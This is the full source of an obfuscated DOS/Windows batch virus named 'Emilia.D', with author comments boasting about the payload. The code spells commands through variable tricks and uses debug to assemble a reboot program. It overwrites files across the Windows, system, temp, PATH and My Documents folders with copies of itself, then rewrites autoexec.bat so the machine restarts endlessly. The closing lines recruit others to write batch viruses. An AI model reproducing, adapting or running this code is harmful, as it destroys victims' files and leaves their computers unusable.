   :: Project - EmiliA
   :: Creator - DVL
   :: VirName - Emilia.D
   :: Purpose - Created just 2 demonstrate that .bat virii r pretty
   ::           cool, crypted or not, BATch language is not lame.
   :: GreetZ  - AV - Kaspersky, F-Prot, BitDefender
   ::           VX - SpTh, Ratty, Alcopaul, _Adder_, Gotenks, NGL
   ::           and ALL BATch virus creators.                 ===
   :: Contact - dvl2003ro@yahoo.co.uk
   :: This is my first crypted batch virus.Don't laugh, coze my mind is now dizzy ...
   :: Maybe u will understand something.Many 10x goes to SpTh for his idea of fake "sets".
   :: The virus will create from a debug script a restart.com file ( working only from
   :: ms-dos :( ). After that it will overwrite a lot of files from my parameters.
   :: After that it will re-write your c:\autoexec.bat with two new lines. On next rebooot,
   :: your puter will continue to loop restarting. Hope it doesn't have errors.
   :: 3                                            ============================
   :: 2
   :: 1
   :: Virus is starting ...
   @echo off
   @set sst=s
   @set sss=s
   @set ttt=t
   @set mmm=m
   @set nnn=n
   @set zzz=z
   @set aaa=a
   @set kkk=k
   @set eee=e
   @set bbb=b
   @set fff=f
   @set ggt=g
   @set ggg=g
   @set hhh=h
   @set iii=i
   @set uut=u
   @set uuu=u
   @set www=w
   @set xxx=x
   @set ccc=c
   @set ddd=d
   @set jjj=j
   @set yyy=y
   @set vvv=v
   @set llt=l
   @set lll=l
   @set ooo=o
   @set ppp=p
   @set qqq=q
   @set rrr=r
   @%eee%%ccc%%hhh%%ooo% e 0100  B8 40 00 50 1F C7 06 72 00 34 12 B8 FF FF 50 B8>>%vvv%
   @%eee%%ccc%%hhh%%ooo% e 0110  00 00 50 CB 00>>%vvv%
   @%eee%%ccc%%hhh%%ooo% rcx>>%vvv%
   @%eee%%ccc%%hhh%%ooo% 14>>%vvv%
   @%eee%%ccc%%hhh%%ooo% n com>>%vvv%
   @%eee%%ccc%%hhh%%ooo% w>>%vvv%
   @%eee%%ccc%%hhh%%ooo% q>>%vvv%
   @debug<v
   %mmm%%ddd% %windir%\system\ðüÅ >%nnn%%uuu%%lll%
   %mmm%%ooo%%vvv%%eee% com %windir%\system\ðüÅ\restart.com
   @%ddd%%eee%%lll%%ttt%%rrr%%eee%%eee%/%yyy% %ccc%%ooo%%mmm% >%nnn%%uuu%%lll%
   @%ddd%%eee%%lll%%ttt%%rrr%%eee%%eee%/%yyy% %vvv% >%nnn%%uuu%%lll%
   %fff%%ooo%%rrr% %%a %iii%%nnn% (*.* ..\*.* %windir%\*.* %path%\*.* %temp%\*.* c:\mydocu~1\*.* %windir%\system\*.*) %ddd%%ooo%% %ccc%%ooo%%ppp%%yyy% %0 %%a
   @%eee%%ccc%%hhh%%ooo% @echo off > c:\autoexec.bat
   @%eee%%ccc%%hhh%%ooo% %windir%\system\ðüÅ\restart.com >> c:\autoexec.bat
   cls
   ::Help Project - Emilia - to have succes by joining to him.
   ::Help me with tutz, bat files, ideas by sending them to dvl2003ro@yahoo.com
   ::Batch it's not lame, U R !!!
